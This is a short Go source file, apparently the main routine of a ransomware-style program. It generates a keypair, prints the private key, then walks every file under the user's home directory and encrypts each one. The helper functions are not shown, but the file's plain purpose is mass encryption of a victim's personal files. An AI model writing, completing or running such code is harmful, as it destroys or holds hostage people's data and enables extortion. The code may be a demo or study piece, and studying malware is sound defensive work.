package main

import (
	"fmt"

	"os"
)

func main() {
	fmt.Println("generating keypair...")
	priv := Generate()

	fmt.Println()
	fmt.Println(Stringify(priv))

	startWalk := GetHomeDir()

	Walk(startWalk, func(filePath string, fileInfo os.FileInfo) {
		fmt.Println("encrypting", filePath)

		encrypt(filePath, priv)
	})
}
